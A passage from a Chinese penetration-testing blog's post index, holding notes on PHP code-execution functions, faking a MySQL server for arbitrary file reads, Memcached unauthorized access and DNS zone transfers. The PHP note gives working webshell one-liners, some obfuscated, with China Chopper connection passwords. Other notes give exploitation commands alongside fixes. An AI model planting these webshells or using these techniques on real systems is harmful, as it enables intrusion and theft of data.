&quot;whoami&quot; #查看权限是否提升为system","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"PHP代码执行函数","slug":"PHP代码执行函数","date":"2020-01-13T08:20:20.808Z","updated":"2020-01-17T09:40:21.612Z","comments":true,"path":"2020/01/13/PHP代码执行函数/","link":"","permalink":"https://yejinpoxiao.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/","excerpt":"","text":"1、eval()函数#eval() 函数把字符串按照 PHP 代码来计算 #常见一句话： &lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;2、assert()函数#与eval类似 #常见一句话 &lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;3、array_map()函数#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。 #命令执行http://localhost/123.php?func=system cmd=whoami #菜刀连接http://localhost/123.php?func=assert 密码：cmd $func=$_GET[&apos;func&apos;]; $cmd=$_POST[&apos;cmd&apos;]; $array[0]=$cmd; $new_array=array_map($func,$array); echo $new_array;4、create_function()函数#创建匿名函数 #执行命令和上传文件参考eval函数(必须加分号)。 #菜刀连接密码：cmd $func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();5、preg_replace()函数#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;) #执行命令和上传文件参考assert函数(不需要加分号)。 #将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。 preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);6、call_user_func()函数#传入的参数作为assert函数的参数 #cmd=system(whoami) #菜刀连接密码：cmd call_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);7、call_user_func_array()函数#将传入的参数作为数组的第一个值传递给assert函数 #cmd=system(whoami) #菜刀连接密码：cmd $cmd=$_POST[&apos;cmd&apos;]; $array[0]=$cmd; call_user_func_array(&quot;assert&quot;,$array);8、array_filter()函数#用回调函数过滤数组中的元素：array_filter(数组,函数) #命令执行func=system&amp;cmd=whoami #菜刀连接http://localhost/123.php?func=assert 密码cmd $cmd=$_POST[&apos;cmd&apos;]; $array1=array($cmd); $func =$_GET[&apos;func&apos;]; array_filter($array1,$func);9、uasort()函数#php环境&gt;=&lt;5.6才能用 #uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。 #命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami); #菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd]) 密码：cmd usort($_GET,&apos;asse&apos;.&apos;rt&apos;);","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://yejinpoxiao.xyz/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"使用drony解决APP无法抓包","slug":"使用drony解决APP无法抓包","date":"2019-12-18T06:58:30.602Z","updated":"2020-06-08T06:46:20.705Z","comments":true,"path":"2019/12/18/使用drony解决APP无法抓包/","link":"","permalink":"https://yejinpoxiao.xyz/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/","excerpt":"","text":"原因默认Flutter不会主动使用系统代理，需要单独设置。 解决方案使用抓包工具（Fiddler、burp等都可）抓包，模拟器安装drony抓包前设置指定代理。 环境常规配置：1.抓包工具安装，证书安装；2.安卓模拟器安装，并安装drony3.drony配置(这里试验抓闲鱼的数据包):进入drony,此时是off关闭状态， 向左划动，选择Wi-Fi 对wi-fi进行设置 选择代理模式为手动（Manual） Proxy type代理方式选择 Plain http proxy ，Filter default value 选择 Direct all 选择Rule，设置应用规则 ) Network id处 选择当前wifi的SSID，Action 选择 Local proxy chain， Application 选择需要强制代理的APP，Hostname 及 Port 不填，表示所有的都会被强制代理。 返回到主页面，点击off，变为启动状态 4.抓包工具配置：设置代理ip及端口 后续进行抓包常规操作即可","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"测试姿势","slug":"测试姿势","permalink":"https://yejinpoxiao.xyz/tags/%E6%B5%8B%E8%AF%95%E5%A7%BF%E5%8A%BF/"}]},{"title":"伪造mysql服务端实现任意文件读取","slug":"伪造mysql服务端实现任意文件读取","date":"2019-12-13T09:40:29.302Z","updated":"2020-06-04T10:03:45.769Z","comments":true,"path":"2019/12/13/伪造mysql服务端实现任意文件读取/","link":"","permalink":"https://yejinpoxiao.xyz/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","excerpt":"","text":"研究情况： 当遇到可控MYSQL时怎么进一步搞事情 情景：1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql 2.注入高权限，可--os-shell （可以上传另说，出现上传失败的情况可以利用） 3.。。。。。其他情况 所需环境：虚拟机两个，靶机装mysql，攻击端装py工具：https://github.com/YGnight/Mysqlist 工具介绍：exp_input.py脚本是输入文件，单独读取 启动 1python2 exp_input.py port （port为端口号，3306都可） 读取的文件最后保存在log文件夹下 复现：攻击端运行攻击脚本， exp_input.py 3306 输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini 靶机使用mysql向攻击端发送请求 password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记） 此时返回攻击端，可以看到dos窗口回显了信息 查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"MemCache未授权访问漏洞","slug":"memcache未授权访问漏洞","date":"2018-03-17T16:00:00.000Z","updated":"2020-09-29T03:42:56.493Z","comments":true,"path":"2018/03/18/memcache未授权访问漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2018/03/18/memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"原理Memcached 分布式缓存系统，它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。默认的 11211 端口不需要密码即可访问，直接访问即可获取数据库中所有信息，造成严重的信息泄露。 验证1234stats //查看memcache 服务状态stats items //查看所有itemsstats cachedump 32 0 //获得缓存keyget :state:264861539228401373:261588 //通过key读取相应value，获得实际缓存内容，造成敏感信息泄露 12345678910111213telnet 192.168.1.1 11211Connecting to 192.168.1.1:11211...Connection established.Escape character is '^@]'.stats //查看memcache 服务状态STAT pid 2233STAT uptime 20494233STAT time 1513170633STAT version 1.2.6STAT pointer_size 32...... 修复1、配置memcached监听本地回环地址127.0.0.1。 1234[root@local ~]# vim /etc/sysconfig/memcachedOPTIONS=\"-l 127.0.0.1\" #设置本地为监听[root@local ~]# /etc/init.d/memcached restart #重启服务 ​ 2、当memcached配置为监听内网IP或公网IP时，使用主机防火墙（iptalbes、firewalld等）和网络防火墙对memcached服务端口进行过滤。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"域传送漏洞","slug":"域传送漏洞","date":"2016-08-02T16:00:00.000Z","updated":"2020-09-29T03:44:40.816Z","comments":true,"path":"2016/08/03/域传送漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2016/08/03/%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"原理DNS服务器配置不当，导致匿名用户利用DNS域传送协议获取某个域的所有记录。通过可以实现DNS域传送协议的程序，尝试匿名进行DNS域传送，获取记录。 危害 获取网络拓扑，服务器集中ip地址段 数据库ip 其他敏感服务器ip 暴露大量子域 利用输入nslookup命令进入交互式shell; server 命令参数设定查询将要使用的DNS服务器; ls命令列出某个域中的所有域名; exit命令退出 方法一：1234567891011121314&gt; nslookup默认服务器: public1.114dns.comAddress: 114.114.114.114&gt; server dns.xxx.xxx.cn默认服务器: xxx.xxx.xxx.cnAddress: xxx.xxx.xxx.xxx&gt; ls xxx.xxx.cn[xxx.xxx.xxx.cn] xxx.xxx.cn. NS server = dns.xxx.xxx.cn xxx.xxx.cn. A 127.0.0.1 xxx A 192.168.1.2 ...... 方法二：1nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=xxx.xxx.cn -p 53 -Pn dns.xxx.xxx.cn 修复严格限制允许区域传送的主机，例如一个主DNS服务器应该只允许它的从DNS服务器执行区域传送的功能。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]}]}